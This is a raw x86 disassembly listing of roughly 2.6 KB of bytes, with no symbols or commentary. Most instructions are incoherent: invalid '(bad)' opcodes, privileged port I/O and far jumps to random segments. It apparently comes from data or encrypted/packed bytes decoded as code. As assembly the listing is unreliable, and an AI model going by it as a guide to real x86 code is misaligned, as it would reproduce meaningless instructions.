  425d56:	mov    ds:0xea6b1332,eax
  425d5b:	dec    eax
  425d5c:	sub    DWORD PTR [ebp+0x79],0x603b6d46
  425d63:	add    eax,0xfe5ab032
  425d68:	xor    BYTE PTR [eax+0x64],bl
  425d6b:	repnz pop ss
  425d6d:	imul   edx,DWORD PTR [ecx+0x3575e3bd],0x44
  425d74:	pop    ss
  425d75:	mov    ebp,0x507ce499
  425d7a:	mov    cl,0x2f
  425d7c:	mov    dl,0x91
  425d7e:	test   al,0x7
  425d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d81:	js     0x425d61
  425d83:	and    al,ah
  425d85:	ret    
  425d86:	cs push ebx
  425d88:	adc    DWORD PTR [esi],0x1a
  425d8b:	fwait
  425d8c:	or     esi,ecx
  425d8e:	in     al,dx
  425d8f:	neg    DWORD PTR [eax+0x5d65b73f]
  425d95:	enter  0xfb0f,0xc5
  425d99:	lahf   
  425d9a:	fwait
  425d9b:	rol    DWORD PTR [ecx-0x699657fd],0x8d
  425da2:	inc    eax
  425da3:	lock sub edx,DWORD PTR [edx]
  425da6:	femms  
  425da8:	and    al,0x39
  425daa:	gs call 0x596f:0x2891b7ce
  425db2:	aad    0xe7
  425db4:	push   eax
  425db5:	mov    al,ds:0x7f2bcd65
  425dba:	loope  0x425d9f
  425dbc:	jmp    0xc4724292
  425dc1:	jge    0x425da3
  425dc3:	lods   al,BYTE PTR ds:[esi]
  425dc4:	push   ss
  425dc5:	cmp    eax,0x93ab335d
  425dca:	shr    DWORD PTR [esi+0x71fdee1c],1
  425dd0:	(bad)  
  425dd1:	xor    cl,BYTE PTR [edi+0x7546c3d4]
  425dd7:	and    bl,dl
  425dd9:	out    dx,eax
  425dda:	adc    BYTE PTR [esi-0x7e5a95f8],dh
  425de0:	inc    ebp
  425de1:	xor    bl,ch
  425de3:	sub    al,0xfe
  425de5:	xchg   esi,eax
  425de6:	push   eax
  425de7:	dec    ebp
  425de8:	dec    esp
  425de9:	arpl   WORD PTR ds:[eax+ebx*1],di
  425ded:	or     edx,edx
  425def:	inc    esi
  425df0:	and    BYTE PTR [esi],cl
  425df2:	sbb    cl,0x39
  425df5:	ret    
  425df6:	ret    
  425df7:	sar    ebp,cl
  425df9:	or     eax,ebp
  425dfb:	ins    DWORD PTR es:[edi],dx
  425dfc:	and    DWORD PTR cs:[ebp-0x10],edx
  425e00:	pop    esi
  425e01:	xor    eax,0x5b602a28
  425e06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e07:	ret    0xc306
  425e0a:	(bad)  
  425e0c:	call   0x75a6:0x916a69ac
  425e13:	in     al,0x2a
  425e15:	mov    esp,0xda364292
  425e1a:	sub    eax,DWORD PTR [ecx-0x20]
  425e1d:	jmp    0xf637:0x49ad776a
  425e24:	shl    DWORD PTR [eax-0x52],cl
  425e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e28:	inc    esp
  425e29:	mov    cl,0x4b
  425e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e2c:	jno    0x425dae
  425e2e:	mov    ecx,0xd99f5ac2
  425e33:	xor    ecx,DWORD PTR [edx]
	...
  425e95:	add    dh,al
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	mov    ss:0x942d54b4,eax
  425ea8:	add    DWORD PTR [eax],eax
  425eaa:	pop    es
  425eab:	add    DWORD PTR [eax],eax
  425ead:	add    BYTE PTR [edx+ebx*4],dh
  425eb0:	mov    ebx,ebx
  425eb2:	vpsubusb xmm3,xmm2,XMMWORD PTR [edi+ecx*2]
  425eb7:	or     esp,DWORD PTR [ecx]
  425eb9:	mov    esi,0x1e36aab5
  425ebe:	fst    QWORD PTR [eax-0x25e0fc15]
  425ec4:	in     eax,0x5a
  425ec6:	mov    ah,0x51
  425ec8:	lods   eax,DWORD PTR ds:[esi]
  425ec9:	shr    BYTE PTR ds:0x9deb39a7,cl
  425ecf:	sub    al,0x21
  425ed1:	imul   ebp,DWORD PTR [edi-0x5066f5ff],0x93a623ec
  425edb:	icebp  
  425edc:	xor    eax,0x82c6f6a5
  425ee1:	or     DWORD PTR [ebp+0x56],0xf42a760e
  425ee8:	mov    bl,dl
  425eea:	jl     0x425ecc
  425eec:	xchg   esp,ebp
  425eee:	pop    eax
  425eef:	pop    ecx
  425ef0:	lea    edi,[edi]
  425ef2:	xchg   ecx,eax
  425ef3:	hlt    
  425ef4:	push   edx
  425ef5:	fwait
  425ef6:	mov    ds:0x16cd427c,eax
  425efb:	mov    WORD PTR [esi+esi*2-0x5e22a820],?
  425f02:	mov    eax,ds:0x47757ba8
  425f07:	jo     0x425f2c
  425f09:	xor    ebp,DWORD PTR [eax-0x5]
  425f0c:	fdivp  st(3),st
  425f0e:	sub    eax,0x340fc899
  425f13:	retf   0xd71
  425f16:	xchg   edi,eax
  425f17:	hlt    
  425f18:	dec    ebp
  425f19:	ret    0x4fc6
  425f1c:	push   ebp
  425f1d:	mov    edi,0x72088754
  425f22:	push   es
  425f23:	in     eax,0x5
  425f25:	int    0x66
  425f27:	mov    al,0x1
  425f29:	pop    es
  425f2a:	test   BYTE PTR [ebp-0x33],al
  425f2d:	aam    0xe4
  425f2f:	sti    
  425f30:	dec    eax
  425f31:	inc    esp
  425f32:	sbb    ch,ah
  425f34:	jmp    0xdf41:0x283cc05
  425f3b:	jmp    0x425f5b
  425f3d:	sbb    BYTE PTR [eax],dh
  425f3f:	dec    eax
  425f40:	adc    eax,0xc794640a
  425f45:	outs   dx,DWORD PTR ds:[esi]
  425f46:	fwait
  425f47:	inc    eax
  425f48:	inc    esi
  425f49:	adc    eax,0x6a117727
  425f4e:	push   edi
  425f4f:	inc    esi
  425f50:	retf   0x2990
  425f53:	xchg   edx,eax
  425f54:	adc    BYTE PTR [ebx-0x4a],ch
  425f57:	xchg   ecx,eax
  425f58:	mov    eax,0xca4563b8
  425f5d:	adc    al,0x91
  425f5f:	js     0x425f1a
  425f61:	scas   al,BYTE PTR es:[edi]
  425f62:	(bad)  
  425f63:	into   
  425f64:	es js  0x425fa8
  425f67:	shl    DWORD PTR [edx-0x1],cl
  425f6a:	mov    eax,ds:0x4f6968a2
  425f6f:	int    0x82
  425f71:	retf   
  425f72:	mov    esp,0xe0615d87
  425f77:	xor    ch,bl
  425f79:	mov    bh,0x91
  425f7b:	ror    DWORD PTR [edi-0x1e],cl
  425f7e:	dec    eax
  425f7f:	xchg   DWORD PTR [edx+0xc],esp
  425f82:	sub    al,bl
  425f84:	xchg   ebp,eax
  425f85:	or     edi,DWORD PTR [edi+0x1f9c625]
  425f8b:	cld    
  425f8c:	mov    esi,0xd6961883
  425f91:	push   0xffffffaa
  425f93:	jge    0x425f18
  425f95:	retf   
  425f96:	enter  0x5823,0x38
  425f9a:	cmp    al,0xe7
  425f9c:	jmp    0x426016
  425f9e:	cmc    
  425f9f:	inc    ebx
  425fa0:	loopne 0x425f69
  425fa2:	xor    al,0xec
  425fa4:	xor    ah,dh
  425fa6:	cdq    
  425fa7:	add    eax,esp
  425fa9:	js     0x425fb0
  425fab:	ds xor al,0x61
  425fae:	push   esp
  425faf:	sub    dh,ah
  425fb1:	cmp    al,0x97
  425fb3:	mov    ds:0x33,al
	...
  426014:	add    BYTE PTR [eax],al
  426016:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0xcc33a579
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    BYTE PTR [ebp-0x501aa0ed],dl
  426033:	gs in  al,dx
  426035:	xor    dl,BYTE PTR [edi-0x74]
  426038:	lods   al,BYTE PTR ds:[esi]
  426039:	xor    dl,BYTE PTR [ebp+eax*4-0x33]
  42603d:	in     al,0xe4
  42603f:	mov    edx,0x324a75bd
  426044:	dec    edx
  426045:	adc    eax,0xc610a48d
  42604a:	sbb    ebx,DWORD PTR [edi-0x564599ca]
  426050:	shl    edi,cl
  426052:	pop    ss
  426053:	ins    DWORD PTR es:[edi],dx
  426054:	mov    al,0x9c
  426056:	rcr    DWORD PTR [edi+0x4854f712],1
  42605c:	sub    cl,BYTE PTR [esi]
  42605e:	gs pop ebp
  426060:	push   ds
  426061:	jg     0x4260d4
  426063:	call   0xcb0c905c
  426068:	cmp    edi,esp
  42606a:	test   eax,0xf2e86957
  42606f:	pop    edi
  426070:	lock inc edi
  426072:	ss pushf 
  426074:	inc    ecx
  426075:	(bad)  
  426077:	aam    0x56
  426079:	jp     0x4260aa
  42607b:	imul   eax,DWORD PTR [eax+0x43],0x1b82e08a
  426082:	enter  0x3540,0x44
  426086:	cs cwde 
  426088:	std    
  426089:	jge    0x426032
  42608b:	ja     0x426067
  42608d:	call   0x390b2368
  426092:	mov    ch,BYTE PTR [edi]
  426094:	inc    esi
  426095:	fcomp  DWORD PTR [eax-0x12]
  426098:	jb     0x426026
  42609a:	fmul   QWORD PTR [ecx]
  42609c:	sub    bl,BYTE PTR ss:[edi]
  42609f:	fs push cs
  4260a1:	sbb    cl,ah
  4260a3:	mov    BYTE PTR ds:0x4448345f,bl
  4260a9:	mov    WORD PTR [edx+0xf],ds
  4260ac:	scas   al,BYTE PTR es:[edi]
  4260ad:	in     al,dx
  4260ae:	push   0xfe66ca15
  4260b3:	stos   DWORD PTR es:[edi],eax
  4260b4:	sbb    DWORD PTR [ebx+0x6d704997],esp
  4260ba:	sbb    al,0xac
  4260bc:	std    
  4260bd:	jl     0x4260a1
  4260bf:	stos   DWORD PTR es:[edi],eax
  4260c0:	mov    ebx,0x95fa063a
  4260c5:	push   ebp
  4260c6:	cdq    
  4260c7:	retf   
  4260c8:	stc    
  4260c9:	les    edx,FWORD PTR [ecx+0x3164d27c]
  4260cf:	xor    ebp,DWORD PTR [edi+0x42]
  4260d2:	cmp    eax,0x34ef1c18
  4260d7:	jno    0x42609a
  4260d9:	cdq    
  4260da:	jp     0x4260fb
  4260dc:	jns    0x4260ac
  4260de:	sti    
  4260df:	xlat   BYTE PTR ds:[ebx]
  4260e0:	mov    ds:0xcb97513d,al
  4260e5:	jno    0x426127
  4260e7:	sbb    BYTE PTR [edx+0x78],bh
  4260ea:	fstp   DWORD PTR [ecx-0x11]
  4260ed:	sub    al,0xf6
  4260ef:	or     al,0x18
  4260f1:	push   ecx
  4260f2:	xor    BYTE PTR [edx-0x4],ch
  4260f5:	cmc    
  4260f6:	jg     0x4260ce
  4260f8:	cmp    bh,al
  4260fa:	ins    BYTE PTR es:[edi],dx
  4260fb:	mov    ebp,0x8684910c
  426100:	xchg   DWORD PTR [ebp-0x65],esp
  426103:	or     edx,DWORD PTR [edi+0x6e7562f9]
  426109:	or     ebx,eax
  42610b:	push   ss
  42610c:	stos   BYTE PTR es:[edi],al
  42610d:	cmp    al,0x96
  42610f:	jns    0x42612a
  426111:	or     esi,DWORD PTR [edi+esi*2]
  426114:	jmp    DWORD PTR [edx*2+0x65b2afe0]
  42611b:	fimul  DWORD PTR [eax-0x5a]
  42611e:	jns    0x42615c
  426120:	dec    esp
  426121:	icebp  
  426122:	sbb    eax,DWORD PTR [esi-0x685174d9]
  426128:	scas   eax,DWORD PTR es:[edi]
  426129:	add    bh,BYTE PTR [ebp+eiz*4+0x5a]
  42612d:	test   dh,bl
  42612f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426130:	or     bh,BYTE PTR [eax]
  426132:	jp     0x4260f7
  426134:	cmp    eax,DWORD PTR [eax]
	...
  426196:	fwait
  426197:	and    DWORD PTR [edi],ecx
  426199:	popa   
  42619a:	mov    edi,0x6ffbff6f
  42619f:	sub    BYTE PTR [ebx-0x57c70c7d],bh
  4261a5:	loopne 0x4261e2
  4261a7:	xchg   esi,eax
  4261a8:	add    DWORD PTR [eax],eax
  4261aa:	pop    es
  4261ab:	add    DWORD PTR [eax],eax
  4261ad:	add    BYTE PTR [esi+0x16],ah
  4261b0:	js     0x4261e8
  4261b2:	xlat   BYTE PTR ds:[ebx]
  4261b3:	push   edx
  4261b4:	les    edi,FWORD PTR [edx+0x44328aa1]
  4261ba:	fild   QWORD PTR [eax+0x3e]
  4261bd:	int    0x3a
  4261bf:	jl     0x4261a5
  4261c1:	repnz cmp ebp,DWORD PTR [ecx*1-0x23bf0c5b]
  4261c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261ca:	cwde   
  4261cb:	pop    ds
  4261cc:	mov    esi,0xeddaa5e9
  4261d1:	sahf   
  4261d2:	fild   DWORD PTR [eax+0x7872ac3f]
  4261d8:	jns    0x4261fc
  4261da:	add    al,0x39
  4261dc:	jecxz  0x4261ca
  4261de:	xchg   ecx,eax
  4261df:	jnp    0x4261e4
  4261e1:	ss pop edx
  4261e3:	adc    edi,DWORD PTR [edi]
  4261e5:	(bad)  
  4261e6:	or     al,0x6d
  4261e8:	cwde   
  4261e9:	xchg   esi,eax
  4261ea:	leave  
  4261eb:	xor    al,0x5
  4261ed:	lds    edi,FWORD PTR [edx+0x2c]
  4261f0:	repnz popf 
  4261f2:	push   cs
  4261f3:	aaa    
  4261f4:	sub    BYTE PTR [ebx+ebx*4-0x6b],dl
  4261f8:	mov    edi,0xb39cb9ba
  4261fd:	shld   DWORD PTR [edx],esp,cl
  426200:	push   es
  426201:	stos   DWORD PTR es:[edi],eax
  426202:	leave  
  426203:	stc    
  426204:	test   BYTE PTR [edi],ah
  426206:	adc    al,0xc5
  426208:	mov    ecx,0xb1e36f22
  42620d:	je     0x426223
  42620f:	pop    ecx
  426210:	jecxz  0x42628c
  426212:	jb     0x4261b2
  426214:	sar    WORD PTR [ebp+0x6e7ab781],0xc8
  42621c:	xchg   ebp,eax
  42621d:	test   eax,0xc10922e2
  426222:	retf   
  426223:	lds    edi,FWORD PTR [edx]
  426225:	adc    DWORD PTR [ebx-0x16],0xffffffb8
  426229:	lds    ecx,FWORD PTR [ebp+0x69]
  42622c:	mov    BYTE PTR [ebx-0x64c58bc8],dh
  426232:	ins    DWORD PTR es:[edi],dx
  426233:	jg     0x42625c
  426235:	or     al,0xfe
  426237:	mov    esi,0xe08be10
  42623c:	mov    ebp,0xd1d9e023
  426241:	outs   dx,BYTE PTR ds:[esi]
  426242:	mov    ds:0x51119599,al
  426247:	(bad)  
  426248:	out    0x6e,eax
  42624a:	inc    esi
  42624b:	cli    
  42624c:	into   
  42624d:	fbld   TBYTE PTR [ebx+0x3d]
  426250:	sub    dh,al
  426252:	or     al,ch
  426254:	dec    edi
  426255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426256:	loop   0x4261fa
  426258:	data16 ins BYTE PTR es:[edi],dx
  42625a:	dec    edx
  42625b:	dec    edx
  42625c:	or     BYTE PTR [esi],ah
  42625e:	hlt    
  42625f:	xchg   ebp,eax
  426260:	lea    eax,fs:[edi+ecx*1+0x1ced2a95]
  426268:	fucomp st(1)
  42626a:	push   ds
  42626b:	mov    ebp,esp
  42626d:	or     eax,DWORD PTR [ecx-0xcb267f7]
  426273:	mov    edx,0x5b08fa0d
  426278:	mov    edi,0x5724ca8f
  42627d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42627f:	or     bh,BYTE PTR [edx-0x22]
  426282:	push   cs
  426283:	sahf   
  426284:	lds    esp,FWORD PTR [ebx-0x3987b649]
  42628a:	xchg   edx,eax
  42628b:	adc    al,0xdc
  42628d:	jp     0x426265
  42628f:	jae    0x426268
  426291:	inc    ebp
  426292:	sti    
  426293:	test   eax,0xd4477395
  426298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426299:	das    
  42629a:	mov    eax,?
  42629c:	dec    esi
  42629d:	push   cs
  42629e:	xchg   ebp,eax
  42629f:	mov    cl,0x34
  4262a1:	mov    dx,0x5321
  4262a5:	inc    edi
  4262a6:	fcmovne st,st(3)
  4262a8:	rcl    BYTE PTR [esi],0x84
  4262ab:	into   
  4262ac:	mov    edi,0x4691b532
  4262b1:	scas   eax,DWORD PTR es:[edi]
  4262b2:	lea    ebx,[ebx]
  4262b4:	add    DWORD PTR [eax],0x0
	...
  426316:	push   esp
  426317:	and    eax,0xeefd4e8d
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0x4054
  426323:	test   dl,dh
  426325:	xchg   esi,eax
  426326:	inc    edx
  426327:	xchg   edi,eax
  426328:	add    DWORD PTR [eax],eax
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    BYTE PTR [eax+edi*1+0x7861e349],dl
  426334:	dec    esi
  426335:	scas   eax,DWORD PTR es:[edi]
  426336:	lds    edx,FWORD PTR [edx]
  426338:	mov    ah,0x31
  42633a:	loope  0x4263b1
  42633c:	int3   
  42633d:	jae    0x4262d2
  42633f:	sbb    edi,DWORD PTR [esi-0x6e]
  426342:	div    DWORD PTR [esi+0x78b52fdc]
  426348:	inc    BYTE PTR [esi+eax*8]
  42634b:	loope  0x4263ab
  42634d:	rcr    ch,0xc7
  426350:	sub    edi,edi
  426352:	add    eax,0xd005c94e
  426357:	xor    ebp,DWORD PTR [ecx+0x2664eef7]
  42635d:	das    
  42635e:	jmp    0xb82c5f10
  426363:	lods   al,BYTE PTR ds:[esi]
  426364:	cdq    
  426365:	(bad)  
  426366:	fadd   QWORD PTR ds:0x809a6cb4
  42636c:	(bad)  
  42636d:	jo     0x426367
  42636f:	(bad)  
  426370:	ret    0x31eb
  426373:	daa    
  426374:	cmp    bl,ah
  426376:	mov    ?,ebp
  426378:	nop
  426379:	or     dl,ah
  42637b:	in     eax,0x53
  42637d:	pusha  
  42637e:	lods   al,BYTE PTR ds:[esi]
  42637f:	ror    DWORD PTR [esi],0xbc
  426382:	dec    edx
  426383:	push   esi
  426384:	repnz sbb ah,BYTE PTR [edi+0x35]
  426388:	out    dx,al
  426389:	add    BYTE PTR [ecx],ah
  42638b:	addr16 pop ds
  42638d:	adc    cl,BYTE PTR [ebx]
  42638f:	repnz mov eax,ds:0xcd28505b
  426395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426396:	push   edx
  426397:	push   eax
  426398:	stc    
  426399:	add    al,0x85
  42639b:	xor    esp,esp
  42639d:	jp     0x4263b7
  42639f:	loopne 0x42640c
  4263a1:	adc    bl,BYTE PTR [ecx-0xc23f87e]
  4263a7:	out    0x74,eax
  4263a9:	jne    0x426368
  4263ab:	dec    edx
  4263ac:	add    esi,edx
  4263ae:	add    al,cl
  4263b0:	jmp    0x4263a4
  4263b2:	pop    ds
  4263b3:	dec    edi
  4263b4:	or     al,0x47
  4263b6:	push   es
  4263b7:	add    esi,DWORD PTR ds:0x591fa870
  4263bd:	pop    esp
  4263be:	je     0x426414
  4263c0:	inc    ebp
  4263c1:	fwait
  4263c2:	inc    edi
  4263c3:	pop    esp
  4263c4:	lds    edi,FWORD PTR [ecx-0x37d810d8]
  4263ca:	es xor al,0x52
  4263cd:	test   al,0x49
  4263cf:	dec    ebp
  4263d0:	in     al,dx
  4263d1:	push   es
  4263d2:	dec    ebp
  4263d3:	aam    0xf8
  4263d5:	pop    ds
  4263d6:	sbb    ecx,DWORD PTR [edi]
  4263d8:	sub    dl,0x35
  4263db:	gs jae 0x426399
  4263de:	cli    
  4263df:	xchg   ecx,eax
  4263e0:	fs retf 0x1f4e
  4263e4:	sar    ebp,cl
  4263e6:	sar    BYTE PTR [esi+0x19],0x2c
  4263ea:	dec    edi
  4263eb:	pop    esp
  4263ec:	xor    al,0x73
  4263ee:	lock ds inc edx
  4263f1:	pop    ebx
  4263f2:	sub    dh,BYTE PTR [eax+eiz*8+0x3d]
  4263f6:	aas    
  4263f7:	push   esp
  4263f8:	outs   dx,DWORD PTR ds:[esi]
  4263f9:	stc    
  4263fa:	rcr    BYTE PTR [ebp+eiz*4-0x59],0x1e
  4263ff:	sar    BYTE PTR [ecx],0xad
  426402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426403:	sub    cl,BYTE PTR [edx+0x2d466b88]
  426409:	std    
  42640a:	xchg   esi,eax
  42640b:	jl     0x42640c
  42640d:	push   cs
  42640e:	add    eax,0xd1178e24
  426413:	push   eax
  426414:	enter  0x2bbd,0xe3
  426418:	and    esi,0xb9c5045b
  42641e:	mov    edi,0x82b1fc79
  426423:	jl     0x426418
  426425:	bound  esp,QWORD PTR [eax+0x7d4369bd]
  42642b:	pop    edx
  42642c:	pop    ebp
  42642d:	rol    BYTE PTR [ebp-0x73],1
  426430:	es jle 0x4263ec
  426433:	je     0x4263e6
	...
  426495:	add    BYTE PTR [ecx+0x6f],ch
  426498:	mov    BYTE PTR [eax],cl
  42649a:	mov    gs,edi
  42649c:	jmp    0x7b21f210
  4264a1:	dec    esp
  4264a2:	pop    eax
  4264a3:	not    bh
  4264a5:	pop    eax
  4264a6:	dec    ecx
  4264a7:	cwde   
  4264a8:	add    DWORD PTR [eax],eax
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    BYTE PTR [ebx-0x60],dl
  4264b0:	fsub   st(3),st
  4264b2:	push   eax
  4264b3:	jb     0x4264de
  4264b5:	xor    eax,0x21470414
  4264ba:	bound  edi,QWORD PTR [edi+0xe]
  4264bd:	test   al,0x30
  4264bf:	iret   
  4264c0:	xchg   edx,eax
  4264c1:	test   al,0x59
  4264c3:	stc    
  4264c4:	stos   BYTE PTR es:[edi],al
  4264c5:	mov    ch,0xae
  4264c7:	addr16 pop ebp
  4264c9:	not    edx
  4264cb:	sbb    esi,DWORD PTR es:[edx-0x77]
  4264cf:	pop    dx
  4264d1:	aad    0x98
  4264d3:	push   ebx
  4264d4:	xchg   ecx,eax
  4264d5:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264d7:	sbb    dl,BYTE PTR [ebx]
  4264d9:	jg     0x4264bb
  4264db:	enter  0xe6a3,0x7f
  4264df:	ret    0x7f3f
  4264e2:	cmp    bl,BYTE PTR [ebx]
  4264e4:	mov    WORD PTR [edx-0x13],ds
  4264e7:	or     DWORD PTR [ecx],esp
  4264e9:	xchg   ecx,eax
  4264ea:	loop   0x4264a4
  4264ec:	sbb    edi,DWORD PTR [edi-0x68]
  4264ef:	fcmovbe st,st(5)
  4264f1:	xor    edx,ebp
  4264f3:	call   0x4435:0xb5050933
  4264fa:	push   cs
  4264fb:	jmp    0x5081:0xe0969d11
  426502:	ss hlt 
  426504:	cmp    esp,eax
  426506:	xchg   esi,eax
  426507:	pusha  
  426508:	pusha  
  426509:	push   edi
  42650a:	mov    ds:0x1ed339bc,al
  42650f:	imul   eax,DWORD PTR [ebp-0x22fb4899],0xffffffbe
  426516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426517:	ret    0x7861
  42651a:	jge    0x42650f
  42651c:	push   ecx
  42651d:	add    dh,ch
  42651f:	pusha  
  426520:	sbb    dh,BYTE PTR [ecx+0x54]
  426523:	daa    
  426524:	pop    edx
  426525:	mov    edi,0xdf28839e
  42652a:	add    ch,al
  42652c:	pop    eax
  42652d:	jbe    0x4264e8
  42652f:	cmp    BYTE PTR [ebp-0x3e],dl
  426532:	addr16 cmp ebx,ebp
  426535:	stc    
  426536:	inc    ecx
  426537:	nop
  426538:	call   0x4c42:0xd511ab43
  42653f:	mov    al,bl
  426541:	das    
  426542:	jmp    0xdd11:0xb92eaeca
  426549:	mov    al,ds:0x777b0d9e
  42654e:	adc    ebp,DWORD PTR [eax+eiz*1-0x475b33f5]
  426555:	pop    ebx
  426556:	ss mov bh,0x25
  426559:	dec    esi
  42655a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42655b:	mov    edi,0xc1aab154
  426560:	(bad)  
  426561:	div    dl
  426563:	ds es addr16 leave 
  426567:	cld    
  426568:	aad    0x1f
  42656a:	jecxz  0x42654b
  42656c:	sub    eax,0xb3f6b2ea
  426571:	cmp    al,0x69
  426573:	shr    DWORD PTR [edi+0x27],0x34
  426577:	mov    ebp,0xe1814fcf
  42657c:	ror    BYTE PTR [ebx],cl
  42657e:	and    eax,0xf5bb05c7
  426583:	push   edi
  426584:	stos   BYTE PTR es:[edi],al
  426585:	mov    ebp,0xceaf0d4c
  42658a:	in     eax,0x50
  42658c:	xor    BYTE PTR [ecx-0x5363b43a],bh
  426592:	pop    ecx
  426593:	cmp    al,0xd4
  426595:	xchg   BYTE PTR [ebx],dl
  426597:	push   ss
  426598:	mov    ah,BYTE PTR ds:0xe96d39a4
  42659e:	pop    esi
  42659f:	jmp    edi
  4265a1:	cmp    eax,0x21d4199
  4265a6:	jecxz  0x42659b
  4265a8:	test   al,0x56
  4265aa:	bound  edi,QWORD PTR [ecx]
  4265ac:	test   BYTE PTR [edi-0x6277d076],cl
  4265b2:	inc    esi
  4265b3:	leave  
  4265b4:	and    BYTE PTR [eax],al
	...
  426616:	adc    cl,bl
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	adc    al,0xb6
  426624:	clc    
  426625:	adc    DWORD PTR [eax-0x67],0x1
  426629:	add    BYTE PTR [edi],al
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    bh,bh
  42662f:	or     cl,BYTE PTR [edi]
  426631:	xchg   ebp,eax
  426632:	ins    BYTE PTR es:[edi],dx
  426633:	xchg   ebp,ecx
  426635:	test   ebx,edx
  426637:	(bad)  
  426638:	sar    BYTE PTR [ecx-0x68],cl
  42663b:	fld    TBYTE PTR [ebp+0x23]
  42663e:	(bad)  
  42663f:	loop   0x426602
  426641:	shr    dh,1
  426643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426644:	xor    eax,0x4eb7ed78
  426649:	or     dh,BYTE PTR [ebx]
  42664b:	jno    0x426664
  42664d:	ss xor al,0x4a
  426650:	push   ss
  426651:	aas    
  426652:	pop    ss
  426653:	mov    ebx,DWORD PTR [esi]
  426655:	sbb    al,0xe2
  426657:	cmp    BYTE PTR [ebx],0x5e
  42665a:	call   0x48:0xb139a8f5
  426661:	dec    ebp
  426662:	push   edi
  426663:	add    esp,edi
  426665:	and    BYTE PTR [ebx-0x61],dl
  426668:	cmp    dl,BYTE PTR [ebx+0x7b58bdf9]
  42666e:	(bad)  
  42666f:	xor    eax,DWORD PTR [edx+ebp*2+0x4ade48d1]
  426676:	sti    
  426677:	mov    dh,0x43
  426679:	sbb    esp,ecx
  42667b:	xor    DWORD PTR [ecx-0x4f1d57a0],edi
  426681:	inc    esp
  426682:	shl    BYTE PTR [esi+0x15],cl
  426685:	pop    eax
  426686:	mov    esp,0x414a1f16
  42668b:	xchg   esi,eax
  42668c:	pop    ds
  42668d:	push   esp
  42668e:	fwait
  42668f:	dec    ebx
  426690:	jno    0x42670a
  426692:	sub    bh,ch
  426694:	xchg   esp,eax
  426695:	call   0xe68d:0x3f8c7e4c
  42669c:	xor    ecx,eax
  42669e:	in     eax,dx
  42669f:	ins    BYTE PTR es:[edi],dx
  4266a0:	je     0x42662a
  4266a2:	sar    BYTE PTR [esi+0x63],1
  4266a5:	fsubr  QWORD PTR [edx+0x4712f451]
  4266ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266ac:	cmp    al,0x76
  4266ae:	mov    ds:0xac8556ee,al
  4266b3:	and    DWORD PTR [esi],ecx
  4266b5:	and    eax,0x9ba3c1e7
  4266ba:	(bad)  
  4266bb:	push   ecx
  4266bc:	daa    
  4266bd:	arpl   si,sp
  4266bf:	icebp  
  4266c0:	retf   0xb291
  4266c3:	outs   dx,DWORD PTR ds:[esi]
  4266c4:	loopne 0x426724
  4266c6:	aad    0xfe
  4266c8:	cmp    eax,0xf6133da0
  4266cd:	ins    DWORD PTR es:[edi],dx
  4266ce:	push   ecx
  4266cf:	aaa    
  4266d0:	loope  0x426726
  4266d2:	adc    BYTE PTR [esi+0x9070ce6],dh
  4266d8:	xchg   esi,eax
  4266d9:	sbb    al,0x4e
  4266db:	sbb    ecx,DWORD PTR [edi]
  4266dd:	xchg   esi,eax
  4266de:	test   al,0xa2
  4266e0:	and    cl,BYTE PTR [ecx-0x80]
  4266e3:	mov    edx,0x2fee39d5
  4266e8:	sar    DWORD PTR [eax+0x14],cl
  4266eb:	dec    eax
  4266ec:	xchg   edi,eax
  4266ed:	jns    0x42675c
  4266ef:	fisub  WORD PTR [edx-0x2a6fac7a]
  4266f5:	call   0x2236f4dc
  4266fa:	cmp    BYTE PTR [esi+esi*1-0x2289a089],ch
  426701:	iret   
  426702:	or     ebp,DWORD PTR [ebx-0x65bbd3da]
  426708:	ja     0x4266fa
  42670a:	cmp    eax,0x68f26218
  42670f:	icebp  
  426710:	inc    ecx
  426711:	jns    0x42673c
  426713:	les    esi,FWORD PTR [edi-0x21c0af5a]
  426719:	sbb    ch,BYTE PTR [esi+edi*8]
  42671c:	xor    bl,BYTE PTR [eax-0x261c629d]
  426722:	dec    esi
  426723:	mov    al,ds:0xb0eb8fbc
  426728:	add    eax,0x303cf009
  42672d:	inc    ebx
  42672e:	push   cs
  42672f:	mov    edi,0xce1cc052
  426734:	mov    al,BYTE PTR [eax]
	...
  426796:	mov    eax,0xff2ace8d
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	jns    0x4267e8
  4267a4:	adc    edx,DWORD PTR [ecx+0x19a57]
  4267aa:	pop    es
  4267ab:	add    DWORD PTR [eax],eax
